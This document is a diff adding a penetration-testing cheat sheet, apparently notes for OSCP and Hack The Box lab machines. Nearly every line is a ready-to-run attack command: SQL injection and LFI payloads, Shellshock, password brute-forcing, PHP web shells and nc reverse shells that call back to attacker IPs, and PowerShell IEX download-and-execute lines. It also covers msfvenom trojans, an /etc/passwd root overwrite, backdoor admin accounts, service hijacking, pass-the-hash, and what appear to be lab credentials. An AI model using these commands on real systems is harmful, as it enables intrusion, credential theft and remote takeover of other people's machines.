@@ -1,0 +1,253 @@
+https://redteams.fr/mindmap/view.html?url=.%2Fmaps%2Foscp.mymind
+#ms17-010
+https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+#Good writeup
+https://netosec.com/pwnos-vulnhub-walkthrough/
+https://0xrick.github.io/hack-the-box/ghoul/
+https://github.com/security-prince/PWK-OSCP-Preparation-Roadmap/blob/master/README.md
+
+#http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html
+id=1'+and+0+Union+Select+1,group_concat(column_name),3+ FROM information_schema.columns WHERE table_name="user"+--+
+id=1'+and+0+Union+Select+1,group_concat(table_name),3+ FROM information_schema.tables WHERE table_schema="security"+--+
+union+select+1,2,group_concat(table_name,":",column_name),4,5,6,7+From+information_schema.columns+where+table_schema="databasetable"
+(select+group_concat(table_name,":",column_name)+from+information_schema.columns+where+table_schema="hotel")
+(select+group_concat(host,":",user,":",password)+from+mysql.user)
+(LOAD_FILE("/etc/passwd"))
+user()
+database()
+
+nmap -sC -sC -sV -oA nmap/json 10.10.10.158
+nmap  --script=smb-enum-users
+nmap --script=msrpc-enum 10.11.1.5
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.11.1.5
+nmap --script=*smb-vuln* -p139,445
+nmap --script vuln -p 445 10.11.1.5
+nmap --script smb-enum-shares -p 139,445 
+nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4
+nmap -sV -p 443 --script=ssl-heartbleed 10.11.1.0/24
+nmap -sU -O -p- -oA udp 10.10.10.40
+
+
+#hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&User=^USER^&Password=^PASS^:F=Login failed!"
+hydra -V -f -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt rdp://10.11.1.79
+
+
+
+#LFI https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
+../../../../../../etc/passwd%00
+../../../../../../etc/passwd?
+
+#wordpress
+http://10.11.1.251/wp/wp-content/themes/twentynineteen/404.php
+wpscan --url http://10.11.1.234 -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+#cgi-bin
+() { :;}; echo "Content-Type: text/html"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; hostnam
+
+#dav
+davtest --url http://10.11.1.39
+curl -X PUT http://10.11.1.14/test.html -d @test.html
+curl -X MOVE --header 'Destination:http://10.11.1.14/test.aspx' 'http://10.11.1.14/test.html'
+curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.11.1.116/administrator/alerts/alertConfigField.php
+
+#hashcat
+hashcat  --example-hashes|grep -i mysql -B2 -A4
+hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force --show 
+
+#sql
+select table_name from information_schema.tables where table_schema="security";
+select columns_name from information_schema.columns where table_name="users";
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))z from information_schema.tables group by z;
+select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,0),0x3a,0x3a, floor(rand()*2))z from information_schema.tables group by z;
+select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name="user" limit 2,1),0x3a,0x3a, floor(rand()*2))z from information_schema.columns group by z;
+
+
+#docker
+docker  run  -it  -v  /:/mnt  ubuntu
+
+#phpshellupload
+<?php exec("wget -O /var/www/html/shell.php http://192.168.119.206:443/reverseshell.php"); ?>
+<?php  system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.206 443 >/tmp/f"); ?>
+
+#python
+python -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo 
+
+#find
+find / -perm -4000 -ls 2>/dev/null
+
+#touch
+touch -- ';nc -c bash 10.10.14.2 9445;.php'
+
+#mssql
+mssql-cli -S 10.11.1.31 -U sa -P poiuytrewq
+enable_xp_cmdshell
+xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://192.168.119.206/powerreverse.ps1')"
+							(OR)
+xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.16/reverse.ps1\")
+mssqlclient.py username@10.10.10.125 -windows-auth
+xp_dirtree "\\10.10.14.16\mysmb\"
+responder -I tun0
+
+#oracle
+python3 odat.py sidguesser -s 10.10.10.82
+python3 odat.py passwordguesser -s 10.10.10.82 -d XE
+sqlplus64 scott/tiger@10.10.10.82:1521/XE
+select * from session_privs;
+select * from user_role_privs;
+#change sudo user 
+sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba 
+
+python3 odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile /temp shell.exe rev.exe
+python3 odat.py externaltable -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --exec /temp shell.exe
+
+
+
+#gobuser
+gobuster dir -u http://supersecurehotel.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx 
+
+#wfuzz
+wfuzz -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -u http://supersecurehotel.htb/room.php?cod=1FUZZ 
+wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc '403,404' http://10.11.1.35/FUZZ
+
+#smbmap
+smbmap -H 10.10.10.123	
+smbmap -H 10.10.10.123 -R --depth 20
+smbclient //10.10.10.123/general
+smbmap -H 10.10.10.123 -u admin -p 'asd123'
+smbmap -H 10.10.10.123 -u admin -p 'asd123' -d directoryname
+smbmap  -H 10.11.1.31 -u anonymous 
+smbclient \\\\10.11.1.31\\wwwroot
+smbclient //secnotes.htb/new-site -U "tyler"
+recurse ON
+prompt OFF
+mget * 
+smbclient -N -L //10.11.1.20
+ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'
+smbclient -L 10.11.1.115 -U "" -N (OR) python 37834.py  10.11.1.115 139 192.168.119.206 139 01
+crackmapexec smb 10.10.10.161  --pass-pol -u '' -p ''
+psexec.py active.htb/svc_tgs@10.10.10.100
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cm
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
+
+#samba share 
+python smbserver.py  lab "/home/kali/Documents/
+dir \\192.168.119.206\lab
+copy kkk \\192.168.119.206\lab\
+copy \\192.168.119.206\lab\mimikat\*.* .
+net use p: \\10.10.14.9\smb
+
+
+#rbash
+ssh alfred@10.11.1.101 -t "bash --noprofile""bash --noprofile"
+
+
+#certutil
+certutil.exe -urlcache -f http://192.168.119.206/ncat.exe C:\Users\Bethany\Desktop\ncat.exe
+cmd.exe /c powershell -nop -exec bypass -c "IEX (new-object net.webclient).Downloadstring('http://192.168.119.206/Sherlock.ps1');Find-AllVulns"
+cmd.exe /c powershell -nop -exec bypass -c "IEX (new-object net.webclient).Downloadstring('http://192.168.119.206/shell.ps1')"
+powershell wget "http://192.168.119.206/shell.ps1" -outfile "shell.ps1"
+powershell IEX(New-Object Net.webclient).downloadString('http://192.168.119.206/Invoke-PowerShellTcp.ps1')
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.2/Sherlock.ps1')
+cmd.exe /c powershell -nop -exec bypass -c "IEX (new-object net.webclient).Downloadstring('http://192.168.119.206/Sherlock.ps1');Find-AllVulns"
+
+
+
+#dig
+dig axfr @10.10.10.123 dnsname
+
+#msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.5 LPORT=9443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe > ms17–010.exe
+msfvenom -p windows/shell_reverse_tcp -f asp -v sc -e x86/alpha_mixed LHOST=192.168.119.206 LPORT=80 -o shellcode.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.206 LPORT=443 -f raw > exp.war
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.206 LPORT=80 -f exe > trojan.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f exe > shell.exe
+
+
+#/etc/passwd writeable file
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
+
+#gcc
+i686-w64-mingw32-gcc -o test.exe test.c #32 -bit
+x86_64-w64-mingw32-gcc -o test.exe test.c # 64 -bit
+gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
+
+
+#windows service check
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+#windows useradd
+#http://www.fuzzysecurity.com/tutorials/16.html
+net user /add sys pass
+net user administrator sys
+net group "group name"
+net group "group name" /add username  
+net localgroup administrators sys /add
+net localgroup "Remote Desktop Users" sys /add
+runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.14.9 443
+runas /user:ACCESS\administrator /savecred "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/reverse.ps1')"
+
+
+
+#upnphost
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.206 443 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net start upnphost
+sc config upnphost depend= ""
+or
+sc config SSDPSRV start= auto
+net start SSDPSRV
+net start upnphost
+cd C:\Documents and Settings\Administrator\Desktop
+
+#remote deskop 
+rdesktop -u administrator 10.11.1.223 -r disk:share=/home/kali
+
+#powershell  encode
+echo "ping -n 1 192.168.200.129" | iconv -t utf-16le | base64 -w 0
+cat reverse.ps1 |iconv -t UTF-16LE |base64 -w 0 | xclip  -selection primary
+cat reverse.ps1 |iconv -t UTF-16LE |base64 -w 0 | xclip  -selection clipboard
+
+$a = Get-Content "Oracle Issue.txt"
+$b = [System.Text.Encoding]::UTF8.GetBytes($a)
+[System.Convert]::ToBase64String($b)
+
+#openssl shell
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -key key.pem -cert cert.pem -port 443
+
+#impacket
+https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point
+
+#sharedrive
+impacket-smbserver share $(pwd) -smb2support -user user -password password
+$pass = convertto-securestring 'password' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
+New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\10.10.14.9\share
+
+#permission
+icacls "c:\shell\nc64.exe" /grant Chris:F
+
+#switch user 
+$user = 'Sniper\Chris' ;
+$pass = '36mEAhz/B8xQ~2VM' ;
+$secpass = convertto-securestring $pass -AsPlainTex -Force ;
+$cred = New-Object System.Management.Automation.PSCredential($user,$secpass) ;
+Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock {cmd /c c:\shell\nc64.exe -e powershell 10.10.14.16 443 }
+
+
+#chm
+Out-CHM -Payload "C:\shell\nc.exe 10.10.14.16 9443 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+
+#memory dump 
+volatility -f SILO-20180105-221806.dmp imageinfo 
+volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
+
+
